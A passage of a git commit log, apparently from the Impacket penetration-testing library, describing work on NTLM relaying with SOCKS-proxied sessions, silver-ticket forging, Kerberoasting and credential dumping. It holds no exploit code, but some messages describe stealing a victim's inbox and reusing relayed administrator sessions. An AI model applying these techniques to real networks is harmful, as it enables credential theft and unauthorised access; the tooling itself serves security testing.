Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Thu Jan 4 16:09:24 2018 +0100

    HTTP socks server and target selection improvements

commit da4ebe497391e0dddbc9ec3d9f1afdee087300ef
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Thu Jan 4 15:43:50 2018 +0100

    Added hostname support for SOCKSv5 in socksserver

commit 09f55649b7ee78bd8c6d182e17e985fd887ee6c3
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Wed Jan 3 15:36:16 2018 +0100

    Added SMTP relaying to ntlmrelayx (SOCKS only)

commit 099769996415a63629d56e43326e214d31760071
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Wed Jan 3 15:35:12 2018 +0100

    IMAP SOCKS plugin fixes

commit 57c13382bb6a941fc33aa9e665129d6d4ae21dd1
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Wed Jan 3 11:25:04 2018 +0100

    Added IMAPS SOCKS client

commit 32b50dfbfa6a2bfbdd98b9f0dbaa95d200e9b6bc
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Wed Jan 3 11:24:41 2018 +0100

    Small bugfixes in HTTP(s) SOCKS clients

commit aa22d3640d2b95106a831cd0741c809203fba9e1
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Tue Jan 2 17:56:50 2018 +0100

    Added generic SSL socks wrapper and HTTPS socks relay

commit 8dc9a0cfce2f90102a814846b3d99cceab2ee71a
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Tue Jan 2 17:52:39 2018 +0100

    Fix default port for HTTPS relaying

commit cb12116b293d7a3441fcc0cd2f50631ad17fda7b
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Fri Dec 29 10:53:47 2017 +0100

    Added Protocol to relays table

commit 42aff58cb9e5ad288e9e9e9f01388172d1e4f013
Author: Dirk-jan Mollema <dirkjan.mollema@fox-it.com>
Date:   Wed Dec 27 13:22:25 2017 -0800

    Small fixes + catch exceptions in sockserver for cleanup

commit 03638274731e1e0caea84139a6114a1ebbb2ef32
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Wed Dec 27 17:35:54 2017 +0100

    Socks plugin for IMAP relaying

commit cf6618e1c3d5142c8612a4454044a2777b0d7d95
Author: Dirk-jan Mollema <dirkjan.mollema@fox-it.com>
Date:   Mon Dec 25 13:15:01 2017 -0800

    Added HTTP socks module

commit 2e9d4d9e9579a211b219f02572bbfda492f79814
Author: Dirk-jan Mollema <dirkjan.mollema@fox-it.com>
Date:   Mon Dec 25 13:11:51 2017 -0800

    Small logging fixes for submodules debugging

commit eab6f6f37fde0e47c7b52e2c1bb81311a3246ec0
Author: Dirk-jan Mollema <dirkjan.mollema@fox-it.com>
Date:   Mon Dec 25 09:49:41 2017 -0800

    Added SOCKS plugin autodetection in relay servers

commit 108cac3e3103ac3095f2c14eed98182dde6034f4
Author: Dirk-jan Mollema <dirkjan.mollema@fox-it.com>
Date:   Mon Dec 25 09:17:45 2017 -0800

    Small bug and spelling fix

commit 4fd786dce29635ba72c08bf027b7c5d6f9891972
Author: asolino <bethus@gmail.com>
Date:   Thu Dec 21 19:21:15 2017 -0300

    Seetting threading daemon for SocketServer in SOCKS and better LOG messages

commit a5224b2e7a6c20bc7bb22daa74ef30ddf81677c7
Author: asolino <bethus@gmail.com>
Date:   Thu Dec 21 18:36:51 2017 -0300

    Avoid using PROXY for SOCKS server connection and TargetUtils support for single IP address
    
    - It will convert it to smb://<targetIP>

commit 86537dfff730ea8f6dcddd59a3e9f0bc2e9a1663
Merge: c166e271 ce2571f3
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Dec 21 15:27:23 2017 -0500

    Merge pull request #360 from fox-it/relay-experimental
    
    Bugfixes in relay clients, fixed ldap relaying, fixed threading serve…

commit c166e271208ab24ec516dc63b6a994cd8118ba05
Author: asolino <bethus@gmail.com>
Date:   Thu Dec 21 16:15:11 2017 -0300

    Standard security support added

commit ce2571f39833403bfb58f25303be89e606893cb5
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Wed Dec 20 17:05:01 2017 +0100

    Bugfixes in relay clients, fixed ldap relaying, fixed threading servers for ctrl+c

commit 61c354db9863c175ac606333df5e5f8abea6eac5
Author: asolino <bethus@gmail.com>
Date:   Tue Dec 19 10:52:22 2017 -0500

    Setting SMBSERVER to run as daemon

commit 98171acbd72e250b7ac1def6f1d720bfc58f0776
Author: asolino <bethus@gmail.com>
Date:   Tue Dec 19 10:12:23 2017 -0500

    Not needed anymore

commit b19efbc0672164a23d8e100c24c7d46e941defa0
Author: asolino <bethus@gmail.com>
Date:   Mon Dec 18 21:43:10 2017 -0500

    TargetsProcessor refactoring
    
    - We're now using urlparse. Fits perfectly for what we want to do.
    
         Format of targets are based in URI syntax
             scheme://netloc/path
         where:
             scheme: the protocol to target (e.g. 'smb', 'mssql', 'all')
             netloc: int the form of domain\username@host:port (domain\username and port are optional, and don't forget
                     to escape the '\')
             path: only used by specific attacks (e.g. HTTP attack).
    
         Some examples:
    
             smb://1.1.1.1: It will target host 1.1.1.1 (protocol SMB) with any user connecting
             mssql://contoso.com\joe@10.1.1.1: It will target host 10.1.1.1 (protocol MSSQL) only when contoso.com\joe is
             connecting.

commit 4f39f8688f8c3520e0cca508b725d91c8cdefc74
Author: asolino <bethus@gmail.com>
Date:   Sun Dec 17 02:43:16 2017 -0300

    Cleaning unused switches. When SOCKS is not selected, there's no need for MiniShell

commit 7e4a6b54beaa73b82c57ce9c51b4339b2eb99633
Author: asolino <bethus@gmail.com>
Date:   Sun Dec 17 00:18:26 2017 -0300

    Code cleanup and better organization
    
    - Also adjusting username parameter in attacks functions

commit 1395430f599ce08b1f6811bd7c61f47465a3ff48
Author: asolino <bethus@gmail.com>
Date:   Sat Dec 16 23:58:01 2017 -0300

    Fix for Unicode decoding

commit 7f0247ad265c56c51bd031467bd02bf4486f8212
Author: asolino <bethus@gmail.com>
Date:   Sat Dec 16 23:57:22 2017 -0300

    Code cleanup and better organization
    
    - There's more stuff to improve tho.

commit 38c37b2c73c433d0a78a0dc6e29f01598c042493
Author: asolino <bethus@gmail.com>
Date:   Fri Dec 15 18:47:38 2017 -0300

    Adding activeConnectionsWatcher thread and improving Minishell
    
    - Now you can list the active relayed sessions using the socks command. E.g.:
    ntlmrelayx> socks
    Target          Username                            Port
    --------------  ----------------------------------  ----
    192.168.48.230  CONTOSO/ADMINISTRATOR               1433
    192.168.48.230  VULNERABLE/ADMINISTRATOR            1433
    192.168.48.230  VULNERABLE.CONTOSO.COM/NORMALUSER2  1433

commit c328de54bb405b79f6ed54b977fc511d31f59a2d
Author: asolino <bethus@gmail.com>
Date:   Wed Dec 13 18:48:23 2017 -0300

    Adding a skeleton MiniShell and Flask WebService
    
    - Currently both do nothing, although now you can type exit and ntlmrelayx will exit gracefully.

commit 154bc570379bb6bd34e3cdbda1713b678803a7c1
Author: asolino <bethus@gmail.com>
Date:   Tue Dec 12 12:34:17 2017 -0300

    Fix formatted print error

commit de8c875537a25de6a08b5226a0fe78773abcf05a
Author: asolino <bethus@gmail.com>
Date:   Tue Dec 12 10:28:37 2017 -0300

    Support for SQL Authentication support coming from clients

commit 886aa110a0ef6a755fd143862f5f6d7c94925958
Author: asolino <bethus@gmail.com>
Date:   Sun Dec 10 19:30:13 2017 -0300

    Relay refactoring - Phase IX
    
    - Adding MSSQL SOCKS Plugin. It is now working using mssqlclient.py as the client. Testing needed with other clients
    - Windows Authentication is the only mode supported at the moment.

commit 924f659400cbd01be4f9c84819f9724d49589127
Author: asolino <bethus@gmail.com>
Date:   Thu Dec 7 23:58:49 2017 -0300

    Forgot to commit also this file.
    
    Same description as previous commit

commit 2040d31e45e8a407a2a320cdc3c938f446887a4f
Author: asolino <bethus@gmail.com>
Date:   Thu Dec 7 23:57:07 2017 -0300

    Adding sessionData to ProtocolClients
    
    - Needed for the SOCKS plugins later on to do their jobs. Protocol Clients should store valuable data that the SOCKS plugin will later use. Example, the NTLM CHALLENGE from the target.. or the TDS response after a successful login
    - Commented all the section where Extended security is not negotiated. This is not being used at the moment, and don't know what clients still support that

commit ebb5508eb4dd65e78ea21bcdf9172c97fc553dca
Author: asolino <bethus@gmail.com>
Date:   Wed Dec 6 19:52:21 2017 -0300

    Fixed client session passing to IMAP Attack module
    
    - Tested and working for downloading victim's inbox
    - In any case.. hopefully there will be a socks proxy for IMAP soon.

commit d2736eff91b2411b0748ab54381134460b594f65
Author: Ramzeth <ramzeth@gmail.com>
Date:   Wed Dec 6 18:04:18 2017 +0300

    Update secretsdump.py

commit 6df3275fd1960fdf40ae0aaed37d92bf8b456161
Author: Ramzeth <ramzeth@gmail.com>
Date:   Wed Dec 6 17:59:12 2017 +0300

    OldVal parameter dump added to LSA secrets dump

commit be0117abaaf384070b4b25312283d34bed5952dd
Author: Eyal Mamo <eyal@cymmetria.com>
Date:   Wed Dec 6 10:09:40 2017 +0200

    Replace socket.send() with socket.sendall()

commit 596e006f62d698e1b0ce0638f1defe53647d8051
Author: asolino <bethus@gmail.com>
Date:   Mon Dec 4 12:51:37 2017 -0300

    If getKerberosTGS fails, print the SPN that is failing along with the error

commit a28bd6a643ff7bda7039f84611dcbbc12f978b21
Author: asolino <bethus@gmail.com>
Date:   Mon Dec 4 10:16:51 2017 -0300

    Relay refactoring - Phase VIII
    
    - Added HTTP/S Protocol Clients
    - The attack for this protocol now only downloads the root page. We should send the requested page as a command line switch (instead of being included in the target).
    - Minor changes to other clients

commit 8b3ccf92cbe4a4517adf8f53c57cddf948a3b88a
Author: asolino <bethus@gmail.com>
Date:   Sat Dec 2 01:41:36 2017 -0300

    Simplifying Relay Servers
    
    - Now Relay Servers are Protocol Clients agnostic. No need to specify the protocols supported. You add a new Protocol Client and then the relay server will use them if requested by the user.
    - We should do the same thing for the attacks (although SOCKS is the way to go). The relay servers should only relay connections with the help of the Protocol Clients.

commit cd53cd528795ccb1a9360db9b478d0108254adec
Author: asolino <bethus@gmail.com>
Date:   Sat Dec 2 01:24:57 2017 -0300

    Relay refactoring - Phase VII
    
    - IMAP and IMAPS Protocol Clients implemented. Still testing is needed (installing Exchange now)
    - LDAPS Protocol Client added
    - Added PROTOCOL_CLIENT_CLASSES set as a way to define multiple plugin classes in the same file.
    - Supressed and simplified some logging so the output is more readable

commit 1335449dfae7281dd80d4538e48b1f73c95fbb68
Author: asolino <bethus@gmail.com>
Date:   Fri Dec 1 21:31:12 2017 -0300

    Relay refactoring - Phase VI
    
    - LDAPRelayClient ported to ProtocolClient. Authentication is successful although further attacks are not working (maybe by LDAP setup).
    - Fixed changes in other Protocol Clients when closing connections.

commit 135de38e4ae312b2344428ccee8d71d399765a6b
Author: asolino <bethus@gmail.com>
Date:   Fri Dec 1 20:29:58 2017 -0300

    Adding documentation and removing unused imports

commit 24be3b8b57cf625daf18ac43166f91eb2b9d1392
Author: asolino <bethus@gmail.com>
Date:   Fri Dec 1 20:22:13 2017 -0300

    Fixing SMB->MSSQL
    
    - I wasn't extracting it from the SPNEGO struct. This needs to be reviewed after finishing the Protocol Clients (whether it comes with SPNEGO wrapper)

commit faf5cfb6391b465e1d19bac34534bf9bacca8e78
Author: asolino <bethus@gmail.com>
Date:   Fri Dec 1 20:13:42 2017 -0300

    Fixed typo

commit 128bb1802bfae0825e72763825515f5647800cd8
Author: asolino <bethus@gmail.com>
Date:   Fri Dec 1 20:04:29 2017 -0300

    Relay refactoring - Phase V
    
    - MSSQLClient ported to ProtocolClient base class. HTTP->MSSQL works well, but SMB->MSSQL does not. I'm not sure it wasn't working before. Checking.
    - Added getStandardSecurityChallenge() to ProtocolClient base class. This is needed when standard security is used by the client (old clients eg. WinXP)

commit f37454710f1677df29883cc224d2be1a2c199a74
Author: Matan Hart <me@matanhart.com>
Date:   Thu Nov 30 19:21:31 2017 +0200

    Few changes to create accurate service ticket
    
    Changed some flags to suit service tickets (inspired by mimikatz).

commit 1bdf64412f7fcd0cfe35fda2694c4cccaa8633a7
Author: asolino <bethus@gmail.com>
Date:   Thu Nov 30 10:24:46 2017 -0300

    Fixed kerberos authentication with hashes
    
    - Slightly different approach from the one proposed at https://github.com/CoreSecurity/impacket/pull/356
    - Also, doing the same for etype.
    - Should be compatible with pyasn1 >= 0.2.3

commit 2dfca058894892849387576a2e60073f9cf0200b
Author: Matan Hart <me@matanhart.com>
Date:   Wed Nov 29 15:41:00 2017 +0200

    Implemented silver ticket creation in ticketer.py
    
    Added few changes I forgot to put from the initial commit

commit 3e1a74921f506f51951bfeb1309a10b0722b56d7
Merge: ab50b5a4 ed60110a
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 28 13:06:37 2017 -0300

    Merge branch 'patch-1' of https://github.com/MrAnde7son/impacket

commit 3a2dc9cd4099b942b29aa378ae23dc0a63f64813
Author: Matan Hart <me@matanhart.com>
Date:   Tue Nov 28 15:20:38 2017 +0200

    Implemented silver ticket creation in ticketer.py
    
    Noticed that TGS/Silver Ticket forging in ticketer.py is still in ToDo.
    Added optional -spn flag to support service ticket signing.

commit ab50b5a42c03bac830fdaf381fdcc225270b5221
Author: asolino <bethus@gmail.com>
Date:   Mon Nov 27 19:41:41 2017 -0300

    Adjusting if statement to make it compatible with different pyasn1 versions

commit 49a3c8e553bd8e0699d532634d55486aca0ca585
Merge: 3d88b768 43b25fe6
Author: asolino <bethus@gmail.com>
Date:   Sun Nov 26 11:33:31 2017 -0300

    Merge branch 'Kanda-Motohiro-kanda-spnego-fix'

commit 43b25fe6185ec6482d53808785c47cb707abf0ac
Author: motohiro kanda <kanda.motohiro@gmail.com>
Date:   Sat Nov 25 11:17:09 2017 +0900

    Fixed NegTokenResp generates invalid SupportedMech and NegResult.
    
    spnego.NegTokenResp.fromString has simple typos and generates
    packet without SupportedMech and with invalid NegResult value.

commit 3d88b7682a758f876ad9b747f9925507f55b201a
Author: asolino <bethus@gmail.com>
Date:   Thu Nov 23 19:59:30 2017 -0300

    Adding backward compatibility till pyasn-0.2.3 (at least) + supporting 0.4.2

commit b021dac4b2e268d45c127a76815843ccc569585d
Author: asolino <bethus@gmail.com>
Date:   Thu Nov 23 16:02:24 2017 -0300

    First version of requirements.txt

commit c001138f76075e602f16f7ac143bcb409f1dfef2
Author: asolino <bethus@gmail.com>
Date:   Thu Nov 23 15:40:18 2017 -0300

    Small changes to make it compatible with pyasn1-0.3.7.
    
    - IMPORTANT: This is not backward compatible with old pyasn1 versions. Be sure you run 0.3.7.

commit d1fdeb5264900be2fd4c7364bb9ad7abc53d4185
Author: asolino <bethus@gmail.com>
Date:   Wed Nov 22 17:38:01 2017 -0300

    Pad not needed in AsciiStructure + calculate PadLen when parsing structure
    
    - Addresses https://github.com/CoreSecurity/impacket/issues/350 and https://github.com/CoreSecurity/impacket/issues/348

commit 5861d727ec3150b7c57db9cb7902eb5c7ccb4113
Author: asolino <bethus@gmail.com>
Date:   Wed Nov 15 17:45:37 2017 -0300

    Relay refactoring - Phase IV
    
    - Samba tools now working thru SOCKS proxy with SMB2+ protocol

commit a3eb1ee64d0ad74a8049da71e6ce60c5962842ee
Author: asolino <bethus@gmail.com>
Date:   Wed Nov 15 11:14:21 2017 -0300

    SMB_COM_SESSION_SETUP_ANDX alignment is only needed for UnicodeStructure
    
    - Thanks @tsela85 for pointing it out.
    - Should address https://github.com/CoreSecurity/impacket/issues/342

commit 28f7c8a7cf46a2baaa38d6ec153840ffe03f05ab
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 14 15:39:21 2017 -0300

    Fixing wrong alignment in SMB_COM_SESSION_SETUP_ANDX response
    
    - It was not showing NativeOS/NativeLanMan fields correctly under Wireshark
    - Should fix https://github.com/CoreSecurity/impacket/issues/342

commit cd56a9543392e36da12e47d0cca7e3732c2a6cb5
Author: asolino <bethus@gmail.com>
Date:   Sun Nov 12 16:54:27 2017 -0300

    Relay refactoring - Phase III
    
    - SMB2 Server working, now relay from SMB2+ clients work. In short, HTTP->SMB1/2+ and SMB1/2+->SMB1/2+ working.
    - SMB1/2+ SOCKS proxy working, although SAMBA clients still refuses to use it. Impacket tools work (e.g. proxychains secretsdump).
    - A lot of code cleanup, now should port the other Protocol Clients to the new plugin structure.

commit e20490ff9c14be7a9180136be147955b8d5e0df5
Author: asolino <bethus@gmail.com>
Date:   Fri Nov 10 18:22:48 2017 -0300

    Relay refactoring - Phase II
    
    - SOCKS SMB2 support should work now, although SAMBA suite does not, looks like even if you specify not check signatures, it still does. More research needed. Impacket tools work.
    - ntlmrelayx works on SMBv1 by default, if you want SMB2 specify -smb2support

commit ece6bab611ae4f1ec45079ed58d7904b488bb3cd
Author: asolino <bethus@gmail.com>
Date:   Fri Nov 10 11:38:13 2017 -0300

    Relay refactoring - Phase I
    
    - Adding support for SMBv2 for relay clients (done). Still pending accepting SMBv2+ connections from the server
    - Adding Protocol Client Plugins. Each protocol client (e.g. SMB, MSSQL, IMAP) should use the ProtocolClient base class and adhere to its methods. Protocol Clients are loaded dinamically when ntlmrelayx is started.
    - Relay Servers should be agnostic of the protocol clients supported (right now only working for SMB Protocol Clients, the rest are broken)
    - Had to expose negotiateSessionWildcard in smbconnection in order to do nego for SMB versions (I don't like exposing this)
    - SMB SOCKS pluing still working only for SMBv1 connections.
    
    Pretty unstable as of right now but going to the right direction. SMBv2 works :)

commit ed60110ad210413ff999299bc076fde8ed6db56a
Author: Itamar <mizrahi.itamar@gmail.com>
Date:   Sun Nov 5 18:36:59 2017 +0200

    Subnet Functions
    
    Implemented DhcpEnumSubnets, DhcpGetSubnetInfo, DhcpGetOptionValue, DhcpEnumOptionValues, DhcpEnumAllOptionValues, DhcpEnumOptionValuesV5.
    plus all relevant structures and helper functions.

commit 3a94845ae5f4a70d885d8ae4e6d85a66c675312e
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 24 19:40:04 2017 -0300

    Avoid having duplicate connections against the same target/port/username (socks mode)

commit 1a2195354d832c20b01aae3c897ebc7e2492c677
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 24 19:14:43 2017 -0300

    Adding -debug switch
    
    * Useful for all I'm working on.
    * Might also be useful to you ;)

commit 35f539d53bdff4762ccc84d85a774c5885f9d659
Author: asolino <bethus@gmail.com>
Date:   Mon Oct 16 09:41:48 2017 -0400

    Finishing gracefully when hitting CTRL-C

commit 20a0821fe135d0c76934e4f4865996b04b5d9d3a
Author: asolino <bethus@gmail.com>
Date:   Mon Oct 16 09:40:33 2017 -0400

    Minor clarifications in the initial documentation
    
    * Mainly to differentiate it from smbrelayx.py

commit 41232fdee182a953fe23ade2b50cfd61aafff748
Author: asolino <bethus@gmail.com>
Date:   Mon Oct 16 09:39:58 2017 -0400

    Adding SOCKS support for HTTP->SMB scenario
    
    * Already added to ntlmrelayx.py, forgot to add that here in the first place

commit b54c0dc5491fa94d0e871e9d405155e40a6e63e6
Author: asolino <bethus@gmail.com>
Date:   Mon Oct 16 09:38:25 2017 -0400

    Adding SOCKS support to ntlmrelayx.py
    
    * For now, it works only against smb:// targets
    * Supported both for SMB/HTTP servers

commit d800e42b81a48b70ab151c8e07209ef8785a05cd
Author: asolino <bethus@gmail.com>
Date:   Sun Oct 15 20:10:30 2017 -0400

    Adding even6 test cases

commit 76600282e674b14c4a78ac73a05ac0eb066d5988
Merge: f1900082 3800dc1e
Author: asolino <bethus@gmail.com>
Date:   Sun Oct 15 20:09:04 2017 -0400

    Merge branch 'elitest-DES-Kerberoast'

commit 3800dc1e50b13a11191b74b7c2fd460b4dc790ad
Author: Jim Shaver <dcyherd@gmail.com>
Date:   Thu Oct 12 11:14:22 2017 -0500

    Added support for DES Kerberoast

commit 8729e1a6d8d96d4bb48313e6107ce51b0e1aaf02
Merge: f1900082 39ec8cbf
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Oct 11 09:48:45 2017 -0300

    Merge pull request #333 from franferrax/master
    
    Trivial TypeError issue while LOG formatting

commit 39ec8cbf1e9164eda10de57bfbb71d7a6f5dd767
Author: fferrari <fferrari@coresecurity.com>
Date:   Tue Oct 10 19:26:46 2017 -0300

    Little LOG formatting bug fixed.

commit f19000821e94cbafa4c8c8eb20d4e879023af43e
Author: asolino <bethus@gmail.com>
Date:   Mon Oct 9 14:30:45 2017 -0300

    Adding AES as a possible cipher for TLS session.
    
    * In case RC4 is not present
    * Should address #269, needs checking
    * Has been also reported in #332

commit ddcc3e39029686f956554f646415ea571cb3b491
Merge: 4b7453fb 4cf3b071
Author: asolino <bethus@gmail.com>
Date:   Tue Sep 26 10:50:15 2017 -0300

    Merge branch 'elitest-Kerberoast-AES-final'

commit 4cf3b07141c3d68e83ae6bf4ef18e79979997f06
Merge: 4b7453fb 9943cf1a
Author: asolino <bethus@gmail.com>
Date:   Tue Sep 26 10:49:40 2017 -0300

    Merge branch 'Kerberoast-AES-final' of https://github.com/elitest/impacket into elitest-Kerberoast-AES-final

commit 4b7453fb25f48053ac5351371d8813c33e9ea16e
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 22 11:33:20 2017 -0300

    Adding AES(128) support for SAM hashes decryption
    
    - Similar to what was done in the past for the encryptedPekList in the offline NTDS.
    - Thanks @gentilkiwi for documenting the structures, way easier and elegant approach.
    - Testing needed in all platforms, just to be sure backward compatibility works.
    - Addresses https://github.com/CoreSecurity/impacket/issues/326

commit ec0324a37bc3b42f740c49877c4407d28bf58f1e
Merge: b852457d e7c83ec4
Author: asolino <bethus@gmail.com>
Date:   Mon Sep 18 11:19:38 2017 -0300

    Merge branch 'symeonp-master'

commit e7c83ec431f01486f9f89d3aa306df2286b0d730
Author: asolino <bethus@gmail.com>
Date:   Mon Sep 18 11:17:11 2017 -0300

    If serviceName is not specified, default to empty string.
    
    * This will force the class to generate a random string.
    * And mantains backward compatibility for those scripts that are not specifying a serviceName (e.g. goldenPac, smbrelayx) preventing them to break functionality.

commit 21edeca04f8f5e8bfc86bb9bea55bb9952f418be
Author: Symeon <simospar@gmail.com>
Date:   Mon Sep 18 10:47:10 2017 +0100

    Bug fix: Make psexec service start manual
    
    Add also a "-service-name" parameter where a user can name the service.

commit b852457d298f058a416ba2fcb89dd29f4819c617
Author: asolino <bethus@gmail.com>
Date:   Sat Sep 16 11:20:27 2017 -0300

    If stdout is redirected, default to UTF-8 encoding
    
    * This was preventing using tee or redirect output to a file
    * Reported by @tlathm in https://github.com/CoreSecurity/impacket/issues/319

commit 859317dfffcb1cbca904c73aba40a22d6b3fadd0
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 15 16:32:59 2017 -0300

    Do not logoff when the login didn't work
    
    * It would raise USER_SESSION_DELETED and break this script functionality.

commit 314b4ebfd311b1ec04de47333ea873827e80b1fb
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 15 16:06:17 2017 -0300

    Clarifications when receiving ERROR_DS_NAME_ERROR_NOT_UNIQUE
    
    * Might help users how to get over this issue.
    * If somebody knows how to avoid this from happening ping me.

commit faf2344ca97ad095ab529a885b1700c1b879b44c
Merge: 8e8651e4 a1194194
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 15 12:19:54 2017 -0300

    Merge branch 'MrAnde7son-patch-2'

commit a11941947c9b238a56a0c0a76a56504ccede6088
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 15 12:18:35 2017 -0300

    Adjusting test cases to new [MS-EVEN6] structure
    
    * Adding tests for helper functions as well. Some implemented functions still need test cases

commit 03e7dcae86fa864c683581764df4712170d1ca88
Merge: 8e8651e4 6c2f0cd6
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 15 12:17:49 2017 -0300

    Merge branch 'patch-2' of https://github.com/MrAnde7son/impacket into MrAnde7son-patch-2

commit 8e8651e42452066eab0def2a0a618717e0b6a223
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 15 12:06:10 2017 -0300

    Not needed anymore

commit b33a4484db9401205ef616d0bad497ec310751a9
Merge: e2e5be8b 32b0adac
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 15 12:03:27 2017 -0300

    Merge branch 'MrAnde7son-patch-1'

commit 32b0adacdd4731885cb9a659d1d46907aa7926ea
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 15 11:59:40 2017 -0300

    Some minor cosmetic changes
    
    1. Adding copyright and description
    2. Changing the UUID to match the [MS-EVEN6] standard
    3. Optimized imports

commit 8c5c122063aaea80ffadc7d023bc326049f42e0d
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 15 11:55:38 2017 -0300

    Renaming this interface source code name so it matches the standard [MS-EVEN6]

commit ce5ae5a625257e8adbd05e77abe30048fad05e7e
Merge: e2e5be8b 3d602b0c
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 15 11:42:10 2017 -0300

    Merge branch 'patch-1' of https://github.com/MrAnde7son/impacket into MrAnde7son-patch-1

commit e2e5be8b78f76d96dc15042af834aaab293c8dd0
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 15 11:39:19 2017 -0300

    Better support of Kerberos tests

commit 9cc4d39582e263dde23b5c9870630c7338913e47
Merge: babb63e7 dbc38254
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Sep 15 11:17:48 2017 -0300

    Merge pull request #317 from contactr2m/master
    
    Workaround for #236

commit 6c2f0cd6bc388c9e89b2dac521447803435b27fc
Author: Itamar <mizrahi.itamar@gmail.com>
Date:   Thu Sep 14 22:27:11 2017 +0300

    test case for EVEN6 interface

commit babb63e79ab19de28926946f4b2b81e2e44c4dc6
Merge: 8824999c 8c8f2988
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Sep 12 18:32:06 2017 -0300

    Merge pull request #313 from CoreSecurity/relay-experimental
    
    Relay experimental

commit 9943cf1af94009158c9f6ed251991cfaacdd40d2
Author: Jim Shaver <dcypherd@gmail.com>
Date:   Sun Sep 10 18:15:27 2017 -0500

    Added support for AES Kerberoast tickets

commit 8824999c10d886be57401f7885039d54fc5a1e8a
Merge: 509ca7a9 441afa72
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Aug 31 12:57:43 2017 -0300

    Merge pull request #311 from federicoemartinez/wmiexec-exitcode
    
    returncode set to 1 when there is an error

commit 441afa723fc84854a7ed1995987018cc5b1e2021
Author: Federico Martinez <federicoemartinez@gmail.com>
Date:   Thu Aug 31 12:25:18 2017 -0300

    returncode set to 1 when there is an error
    
    If the connection fails, the exitcode is now set to 1. The behavior for KeyboardInterrupt is still only logging.

commit 509ca7a913dbf37fb01ed8bd374579e3fc1f8047
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 30 16:31:08 2017 -0300

    Decode the CONTROL_PAGEDRESULTS class in order to extract the Cookie
    
    With previous pyasn1 versions (e.g. 0.2.3), this was automatically done by means of
    overridding the __class__ variable (check Control.setComponentByPosition()) when a Control object was decoded.
    Although not the cleanest approach, it's been working so far.
    
    With newer pyasn1 versions (e.g. 0.3.3) is it not possible to override the __class__ variable anymore,
    so we need to come up with a solution when it comes the time of using a paged search control.
    For now, I'm decoding the Control() instance into a KNOWN_CONTROLS[CONTROL_PAGEDRESULTS].
    I say for now, because I'm not convinced of encoding/decoding again something that hopefully could've been solved
    before in the execution path, but this is what I came up with. There's a performance penalty that I'd like to avoid.
    
    Maybe @kacpern can improve this code ;)

commit 7e4e228df13611a3f53a0d0ce7575efff8d204cb
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 30 14:25:34 2017 -0300

    Adding pyasn1 exception when checking salt values
    
    * Aiming at being compatible with latest pyasn1 versions

commit 3d602b0c02ae5e0bdc127fe77855ee291b0c28d2
Author: Itamar <mizrahi.itamar@gmail.com>
Date:   Tue Aug 29 12:15:40 2017 +0300

    Create eventlog.py

commit 3e0938ef281ccecd9e20bf02bd038d7cd2c19f69
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 15 17:54:16 2017 -0300

    Improved support for Unicode Strings inside and ENCODED_STRING value
    
    * In those cases where a list of items was parsed, there were some inconsistencies
    * Should address https://github.com/CoreSecurity/impacket/issues/304
    * Further testing is needed to be sure we're not breaking anything else.

commit 23be93ed82733e11761dc0bb850e51e744310ba1
Merge: 049f2831 8fd81d80
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Aug 14 11:52:06 2017 -0300

    Merge pull request #303 from machosec/patch-3
    
    Support Global Catalog authentication

commit 8fd81d80ad39287a85390c8966a24ec3e04e3a66
Author: Matan Hart <matan.hart@cyberark.com>
Date:   Mon Aug 14 17:40:23 2017 +0300

    Added Global Catalog support
    
    Small addition to query the global catalog (port 3268) instead of LDAP.

commit 049f2831f5e911926aa23d8e0e9b171770d97f16
Author: asolino <bethus@gmail.com>
Date:   Fri Aug 11 14:27:01 2017 -0300

    Matching output with rpcdump.py

commit 85c6fc7c497d1072809c0b90d9bb8da9591fe5a7
Author: asolino <bethus@gmail.com>
Date:   Thu Aug 10 20:30:42 2017 -0300

    Forgot to check we support SMB3 Encryption
    
    * Done a while ago here https://github.com/CoreSecurity/impacket/commit/32ec8ab90fff2717ebeef33bdb25b1ada49b8315

commit 9325006d90d0e7b1a929b130bb32984ac26a1028
Author: asolino <bethus@gmail.com>
Date:   Mon Aug 7 15:53:04 2017 -0300

    Making output a little bit nicer
    
    * Instead of printing the UUID tuple, I break it down in UUID and version

commit 1a3beb60f211740ee1f66b0374ed8e5f0c713d42
Author: asolino <bethus@gmail.com>
Date:   Mon Aug 7 11:07:33 2017 -0300

    Changing Service Creation flags
    
    * Following @ldionmarcil advise (https://github.com/byt3bl33d3r/CrackMapExec/pull/197) to avoid issues with multiple server's reboot in those cases where the service couldn't be deleted for some reason.

commit 56f7f584a65e87eb783cce370fd1b9191e30b495
